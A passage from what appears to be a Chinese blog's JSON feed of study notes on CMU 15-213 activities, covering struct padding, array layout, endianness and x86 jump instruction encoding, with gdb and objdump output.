punctuation\">;</span></pre></td></tr></table></figure><p>继续输入 <code>c</code> ，handout 提示断点处的函数将 <code>struct course</code>  结构的值作为传入参数，使用 <code> x/4wx $rdi</code>  查看 <code>%rdi</code>  处的内存可以看到：</p>\n<pre><code>(gdb) x/4wx $rdi\n0x601100 &lt;course&gt;:      0x00015213      0x00015513      0x00018213      0x00018600\n</code></pre>\n<p>我们可以发现该处的四个值就是： <code>0x15213 0x15513 0x18213 0x18600</code></p>\n<p>我们定义结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">increasing</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">char</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">short</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">long</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>假设</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x0a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">0x0b0b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">0x0c0c0c0c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token number\">0x0d0d0d0d0d0d0d0d</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>继续输入 <code>c</code> ，我们使用 <code>x/32bx $rdi</code>  来查看结构体内容，内容如下：</p>\n<pre><code>(gdb) x/32bx $rdi\n0x6010e0 &lt;increasing&gt;:  0x0a    0x00    0x0b    0x0b    0x0c    0x0c    0x0c    0x0c\n0x6010e8 &lt;increasing+8&gt;:        0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d    0x0d\n0x6010f0 &lt;increasing+16&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6010f8 &lt;increasing+24&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>和我们料想的情况一致。</p>\n<p>将结构体内容重新排列如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">rearranged</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">char</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">long</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">short</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这种方法按理论来说应该比上面那种多用 8 个字节。结果验证如下：</p>\n<pre><code>(gdb) x/32bx rearranged\n0x6010a0 &lt;rearranged&gt;:  0x0a    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6010a8 &lt;rearranged+8&gt;:        0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b    0x0b\n0x6010b0 &lt;rearranged+16&gt;:       0x0c    0x0c    0x00    0x00    0x0d    0x0d    0x0d    0x0d\n0x6010b8 &lt;rearranged+24&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<h2 id=\"arrays-of-structs\"><a class=\"markdownIt-Anchor\" href=\"#arrays-of-structs\">#</a> Arrays of Structs</h2>\n<p>有结构体如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pair</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> large<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> small<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pair</span> pairs <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span> xabababab <span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span> xcdcdcdcd <span class=\"token punctuation\">,</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>每个 <code>pair</code>  应该是 8 个字节。因为 <code>int</code>  类型占 4 个字节， <code>char</code>  类型占 1 个字节。<strong>此外结构体的长度必须是结构体中体积最大的类型的整数倍</strong>，该结构体中最大的是 <code>int</code>  类型，4 个字节，因此结构体的长度必须是 4 个字节的倍数，因此是 8 个字节，需要在 <code>char</code>  后再加 3 个字节的 <code>padding</code> 。 <code>pairs</code>  是一个包含两个结构体变量的数组，1 个变量是 8 个字节，2 个就是 16 个字节。</p>\n<p>我们验证一下 (此处 <code>pairs</code>  也可以替换成 <code>&amp;pairs</code> )：</p>\n<pre><code>(gdb) x/16bx pairs\n0x601080 &lt;pairs&gt;:       0xab    0xab    0xab    0xab    0x01    0x00    0x00    0x00\n0x601088 &lt;pairs+8&gt;:     0xcd    0xcd    0xcd    0xcd    0x02    0x00    0x00    0x00\n</code></pre>\n<p>此外，结构体中可以包含数组，此时 <code>结构体的alignment = max(数组中最大元素，结构体其他元素)</code> 。例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">triple</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">short</span> large <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> small<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其中 <code>short</code>  类型 2 个字节， <code>char</code>  类型 1 个字节。该结构体的长度 = 2 字节的整数倍。</p>\n<h2 id=\"2-d-arrays\"><a class=\"markdownIt-Anchor\" href=\"#2-d-arrays\">#</a> 2-D Arrays</h2>\n<p>一个嵌套的数组如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> nested <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>swig￼<span class=\"token number\">0</span><span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>输入如下命令查看内存 <code>nested</code>  处的值：</p>\n<pre><code>(gdb) x/6bx nested\n0x601076 &lt;nested&gt;:      0x00    0x01    0x02    0x10    0x11    0x12\n</code></pre>\n<p>可以看到一个单元是 1 个字节，一共 6 个单元。数组元素按照行顺序排列。</p>\n<p>函数 <code>access</code>  的 C 版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">int8_t</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> row<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> column<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>column<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仔细查了一下<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzU2OTM5MzM=\">资料</span>，在 C 语言中这里有两种写法要注意一下区分：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 定义一个指针 arr，指向一个包含 10 个元素的数组，arr 可以是 new int [n][3], 它可以是个二维数组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 定义一个包含 10 个元素的数组，其中每个元素都是一个 int 类型的指针，其起始地址为 arr</span></pre></td></tr></table></figure><p>这样声明的原因是： <code>[]</code>  运算符的优先级比 <code>*</code>  高，因此需要通过 <code>()</code>  来把 <code>*arr</code>  括起来。</p>\n<p>由此， <code>access</code>  函数的传入参数 <code>arr</code>  是一个指针，该指针指向一个 3 个元素的数组。可以有 <code>n</code>  个这样的指针，构成一个二维数组。如 <code>arr = new int[n][3]</code> ，那么 <code>arr</code>  有 n 行，每行都是一个指向三个元素的数组。这种表示不能用于第二维度（列）不等于 3 的数组，如 <code>int flipped [3][2]</code> 。</p>\n<p>如果要将 C 语言版本的 <code>access</code>  转化为汇编指令， <code>&amp;arr[row][col] = arr + row * 3 + col</code> （因为这里每个 <code>int</code>  都是一个字节，因此不需要乘上多余的 <code>sizeof(T)</code> ，否则就需要乘上 <code>sizeof(T)</code> 。可以使用一个寄存器作为 <code>arr</code> ，计算 <code>3 * row</code> ，再加上 <code>col</code> ，最后对指针解引，放到返回值中。</p>\n<p>对函数 <code>access</code>  进行反汇编，得到如下指令：</p>\n<pre><code>(gdb) disassemble access\nDump of assembler code for function access:\n   0x00000000004005b5 &lt;+0&gt;:     lea    (%rsi,%rsi,2),%rax ;; rax = 3 * rsi\n   0x00000000004005b9 &lt;+4&gt;:     add    %rax,%rdi ;; rdi += 3 * rsi\n   0x00000000004005bc &lt;+7&gt;:     movzbl (%rdi,%rdx,1),%eax ;; eax = *(rdi + 3 * rsi + rdx)\n   0x00000000004005c0 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>这里我想 <code>%rdi</code>  是 <code>arr</code>  的基地址， <code>%rsi</code>  是 <code>row</code> ， <code>rdx</code>  是 <code>col</code> 。我们首先计算了 <code>3 * rsi</code> ，将其加到 <code>%rdi</code>  中，然后计算 <code>3 * %rsi + %rdx</code> 。</p>\n<p>现在给 3 个数组：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> first <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x00</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">int8_t</span> second <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span> multilevel <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>first <span class=\"token punctuation\">,</span> second <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里 <code>multilevel</code>  是一个嵌套的数组，其第一个元素 <code>first</code>  是一个 3 个字节的数组，其本身是个指针。第二个元素 <code>second</code>  同理。<br>\n <code>multilevel</code>  的每个元素是 8 个字节。数组的每个元素是 1 个字节。输入如下指令检验：</p>\n<pre><code>(gdb) x/2gx multilevel\n0x601060 &lt;multilevel&gt;:  0x0000000000601073      0x0000000000601070\n(gdb) x/3bx first\n0x601073 &lt;first&gt;:       0x00    0x01    0x02\n(gdb) x/3bx multilevel[0]\n0x601073 &lt;first&gt;:       0x00    0x01    0x02\n(gdb) p &amp;first\n$4 = (int8_t (*)[3]) 0x601073 &lt;first&gt;\n(gdb) p &amp;second\n$5 = (int8_t (*)[3]) 0x601070 &lt;second&gt;\n</code></pre>\n<p>将上述 C 语言程序换成如下程序：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token function\">accessMultilevel</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>arr <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> row <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> column<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>row<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>column<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里将 <code>int8_t (*arr)[3]</code>  换成了 <code>int8_t **arr</code> ，也就是说这个 <code>arr</code>  可以指向一个二维数组，而这个二维数组的长和宽可以不定。<br>\n这里的计算公式就是 <code>a[row][col] = *(*(arr + row * 8) + column)</code> (因为 <code>int8_t</code>  是 1 个字节，所以无需乘上 <code>sizeof(T)</code> )。此处 <code>arr</code>  应该是基地址， <code>row</code>  存储在一个寄存器中， <code>column</code>  存储在一个寄存器中。</p>\n<p>对该函数进行反汇编，结果如下：</p>\n<pre><code>(gdb) disassemble accessMultilevel\nDump of assembler code for function accessMultilevel:\n   0x00000000004005c1 &lt;+0&gt;:     add    (%rdi,%rsi,8),%rdx ;; %rdx += *(%rdi + 8 * %rsi)\n   0x00000000004005c5 &lt;+4&gt;:     movzbl (%rdx),%eax ;; %eax = *(%rdx)\n   0x00000000004005c8 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这里 <code>%rdx</code>  中存储的是 <code>column</code> ， <code>%rdi</code>  中存储的是 <code>arr</code>  的基地址， <code>%rsi</code>  中存储的是 <code>row</code> 。如果 <code>first</code>  和 <code>second</code>  都含有 4 个元素的话，地址的计算不影响。但是如果俩数组长度不一样，那么索引的时候可能会出现地址越界的问题。</p>\n<p>如果数组这样定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">int8_t</span> <span class=\"token operator\">*</span> multilevel <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>first<span class=\"token punctuation\">,</span> first<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>那么如果修改一个 <code>first</code>  的元素值的话，两个索引指向同一个数组，两索引对应数组那个值都会改变。</p>\n<h2 id=\"endianness-optional\"><a class=\"markdownIt-Anchor\" href=\"#endianness-optional\">#</a> Endianness (Optional)</h2>\n<p>还是之前那个 <code>courses</code>  结构体，我们先按照 4 个字节一组的单位打印它的值看看，再按照 1 个字节一组为单位打印前 4 个字节看看：</p>\n<pre><code>(gdb) x/4wx courses\n0x601110 &lt;courses&gt;:     0x00015213      0x00015513      0x00018213      0x00018600\n(gdb) x/4bx courses\n0x601110 &lt;courses&gt;:     0x13    0x52    0x01    0x00\n</code></pre>\n<p>我们可以看到一个数 ( <code>int</code>  类型，4 个字节)，按照 4 个字节一组打印的时候，显示的是 <code>0x15213</code> ，但是按照单个字节打印的时候发现低地址字节存放在低地址处，高地址字节存放在高地址处，因此该机器为小端序机器。小端序机器的缺陷在于不方便单字节读取，字节的顺序是倒过来的。</p>\n<p>但是小端序机器也有优点， <code>narrowingCast</code>  函数的 C 语言版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">narrowingCast</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>num<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们对 <code>narrowingCast</code>  函数进行反汇编，得到如下结果：</p>\n<pre><code>(gdb) disassemble narrowingCast\nDump of assembler code for function narrowingCast:\n   0x00000000004005c9 &lt;+0&gt;:     mov    (%rdi),%eax\n   0x00000000004005cb &lt;+2&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这个函数的功能是，将一个 <code>long*</code>  类型的指针解引，然后把它指向的地址的 4 个字节赋给 <code>%eax</code> 。<br>\n这里的一个问题是，对于一个数字： <code>0x0000000012345678</code> 。如果是小端法，低位字节存储在 <code>%rsp</code>  处，一直到 <code>%rsp + 3</code> 。而如果是大端法，低位字节存储在 <code>%rsp + 7</code> ，高位字节存储在 <code>%rsp + 4</code> 。因此如果是大端法，就没法用 <code>mov (%rdi),%eax</code>  来获取值，而应该用 <code>mov 4(%rdi),%eax</code>  来获取值</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/",
            "title": "15-213 Machine Control Activity 记录",
            "date_published": "2024-02-29T09:14:07.000Z",
            "content_html": "<h2 id=\"Basic-Control-Flow\"><a href=\"#Basic-Control-Flow\" class=\"headerlink\" title=\"Basic Control Flow\"></a>Basic Control Flow</h2><p>首先回答 Q1：为什么 JZ 和 JE 指令相同？<br>对于 JZ，即 jump if zero，在跳转之前，我们首先需要将其与 0 做差，判断结果的 ZF 是否等于 1。对于 JE，我们首先将两数做差（也可以使用<code>testq</code>指令？），然后判断 ZF 是否等于 1。JZ 和 JE 都是对 ZF 进行判断，然后进行跳转。</p>\n<p>然后我们回答 Q2：首先阅读<code>jumps.S</code>。我们发现<code>jumps.S</code>就是以<code>jump_insns</code>开头的一群跳转指令的集合。然后我们输入如下指令：</p>\n<pre><code class=\"bash\">$ as jumps.S -o jumps.o\n$ objdump -d jumps.o\n</code></pre>\n<p>其结果如下：</p>\n<pre><code class=\"asm\">\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   eb 34                   jmp    36 &lt;destination&gt;\n   2:   70 32                   jo     36 &lt;destination&gt;\n   4:   71 30                   jno    36 &lt;destination&gt;\n   6:   72 2e                   jb     36 &lt;destination&gt;\n   8:   72 2c                   jb     36 &lt;destination&gt;\n   a:   72 2a                   jb     36 &lt;destination&gt;\n   c:   73 28                   jae    36 &lt;destination&gt;\n   e:   73 26                   jae    36 &lt;destination&gt;\n  10:   73 24                   jae    36 &lt;destination&gt;\n  12:   74 22                   je     36 &lt;destination&gt;\n  14:   74 20                   je     36 &lt;destination&gt;\n  16:   75 1e                   jne    36 &lt;destination&gt;\n  18:   75 1c                   jne    36 &lt;destination&gt;\n  1a:   76 1a                   jbe    36 &lt;destination&gt;\n  1c:   76 18                   jbe    36 &lt;destination&gt;\n  1e:   77 16                   ja     36 &lt;destination&gt;\n  20:   77 14                   ja     36 &lt;destination&gt;\n  22:   78 12                   js     36 &lt;destination&gt;\n  24:   79 10                   jns    36 &lt;destination&gt;\n  26:   7c 0e                   jl     36 &lt;destination&gt;\n  28:   7c 0c                   jl     36 &lt;destination&gt;\n  2a:   7d 0a                   jge    36 &lt;destination&gt;\n  2c:   7d 08                   jge    36 &lt;destination&gt;\n  2e:   7e 06                   jle    36 &lt;destination&gt;\n  30:   7e 04                   jle    36 &lt;destination&gt;\n  32:   7f 02                   jg     36 &lt;destination&gt;\n  34:   7f 00                   jg     36 &lt;destination&gt;\n\n0000000000000036 &lt;destination&gt;:\n  36:   c3                      retq\n</code></pre>\n<p>这些指令的共同点就是都跳转到地址为 36 的<code>destination</code>处。此外，每个跳转指令的编码都是 2 个字节，第二个字节的值即为跳转的相对偏移地址，其值 &#x3D; 目的地址 - 下一套指令的地址（因为执行到这里的时候 PC 已经指向下一条了），所以需要将该值增加到 PC 中，然后进行跳转。</p>\n<p>接下来我们将<code>.skip 97</code>一行注释掉，然后再编译并且反汇编看看：</p>\n<pre><code>\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   e9 bd 00 00 00          jmpq   c2 &lt;destination&gt;\n   5:   0f 80 b7 00 00 00       jo     c2 &lt;destination&gt;\n   b:   0f 81 b1 00 00 00       jno    c2 &lt;destination&gt;\n  11:   0f 82 ab 00 00 00       jb     c2 &lt;destination&gt;\n  17:   0f 82 a5 00 00 00       jb     c2 &lt;destination&gt;\n  1d:   0f 82 9f 00 00 00       jb     c2 &lt;destination&gt;\n  23:   0f 83 99 00 00 00       jae    c2 &lt;destination&gt;\n  29:   0f 83 93 00 00 00       jae    c2 &lt;destination&gt;\n  2f:   0f 83 8d 00 00 00       jae    c2 &lt;destination&gt;\n  35:   0f 84 87 00 00 00       je     c2 &lt;destination&gt;\n  3b:   0f 84 81 00 00 00       je     c2 &lt;destination&gt;\n  41:   75 7f                   jne    c2 &lt;destination&gt;\n  43:   75 7d                   jne    c2 &lt;destination&gt;\n  45:   76 7b                   jbe    c2 &lt;destination&gt;\n  47:   76 79                   jbe    c2 &lt;destination&gt;\n  49:   77 77                   ja     c2 &lt;destination&gt;\n  4b:   77 75                   ja     c2 &lt;destination&gt;\n  4d:   78 73                   js     c2 &lt;destination&gt;\n  4f:   79 71                   jns    c2 &lt;destination&gt;\n  51:   7c 6f                   jl     c2 &lt;destination&gt;\n  53:   7c 6d                   jl     c2 &lt;destination&gt;\n  55:   7d 6b                   jge    c2 &lt;destination&gt;\n  57:   7d 69                   jge    c2 &lt;destination&gt;\n  59:   7e 67                   jle    c2 &lt;destination&gt;\n  5b:   7e 65                   jle    c2 &lt;destination&gt;\n  5d:   7f 63                   jg     c2 &lt;destination&gt;\n  5f:   7f 61                   jg     c2 &lt;destination&gt;\n        ...\n\n00000000000000c2 &lt;destination&gt;:\n  c2:   c3                      retq\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vY2QvRTI2NTAyXzAxL2h0bWwvRTI4Mzg4L2VvaXlnLmh0bWw=\">Oracle 的 x86 Assembly Language Reference Manual </span>中写道：</p>\n<blockquote>\n<p>.skip integer, value</p>\n<p>While generating values for any data section, the .skip directive causes integer bytes to be skipped over, or, optionally, filled with the specified value.</p>\n</blockquote>\n<p>将 97 改为 98，再次处理后查看：</p>\n<pre><code>\njumps.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;jump_insns&gt;:\n   0:   e9 c2 00 00 00          jmpq   c7 &lt;destination&gt;\n   5:   0f 80 bc 00 00 00       jo     c7 &lt;destination&gt;\n   b:   0f 81 b6 00 00 00       jno    c7 &lt;destination&gt;\n  11:   0f 82 b0 00 00 00       jb     c7 &lt;destination&gt;\n  17:   0f 82 aa 00 00 00       jb     c7 &lt;destination&gt;\n  1d:   0f 82 a4 00 00 00       jb     c7 &lt;destination&gt;\n  23:   0f 83 9e 00 00 00       jae    c7 &lt;destination&gt;\n  29:   0f 83 98 00 00 00       jae    c7 &lt;destination&gt;\n  2f:   0f 83 92 00 00 00       jae    c7 &lt;destination&gt;\n  35:   0f 84 8c 00 00 00       je     c7 &lt;destination&gt;\n  3b:   0f 84 86 00 00 00       je     c7 &lt;destination&gt;\n  41:   0f 85 80 00 00 00       jne    c7 &lt;destination&gt;\n  47:   75 7e                   jne    c7 &lt;destination&gt;\n  49:   76 7c                   jbe    c7 &lt;destination&gt;\n  4b:   76 7a                   jbe    c7 &lt;destination&gt;\n  4d:   77 78                   ja     c7 &lt;destination&gt;\n  4f:   77 76                   ja     c7 &lt;destination&gt;\n  51:   78 74                   js     c7 &lt;destination&gt;\n  53:   79 72                   jns    c7 &lt;destination&gt;\n  55:   7c 70                   jl     c7 &lt;destination&gt;\n  57:   7c 6e                   jl     c7 &lt;destination&gt;\n  59:   7d 6c                   jge    c7 &lt;destination&gt;\n  5b:   7d 6a                   jge    c7 &lt;destination&gt;\n  5d:   7e 68                   jle    c7 &lt;destination&gt;\n  5f:   7e 66                   jle    c7 &lt;destination&gt;\n  61:   7f 64                   jg     c7 &lt;destination&gt;\n  63:   7f 62                   jg     c7 &lt;destination&gt;\n        ...\n\n00000000000000c7 &lt;destination&gt;:\n  c7:   c3                      retq\n</code></pre>\n<blockquote>\n<p>下一个问题是：为什么会这样？指令<code>eb f0</code>又是做什么的？This happens for each instruction that needs to<br>encode a change in %rip larger than 0x7F.（源自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9hY3Rpdml0aWVzL21hY2hpbmUtY29udHJvbC1zb2xuLnBkZg==\">Solution</span>)</p>\n</blockquote>\n<h2 id=\"Comparisons-and-Conditional-Set-Instructions\"><a href=\"#Comparisons-and-Conditional-Set-Instructions\" class=\"headerlink\" title=\"Comparisons and Conditional Set Instructions\"></a>Comparisons and Conditional Set Instructions</h2><p>运行<code>gdb ./cmp-set</code>，输入<code>r</code>，提示如下：</p>\n<pre><code>(gdb) r\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set\n\nThis program should be run inside GDB:\n  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set\n  (gdb) r\nIf you didn&#39;t run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.\n\nProgram received signal 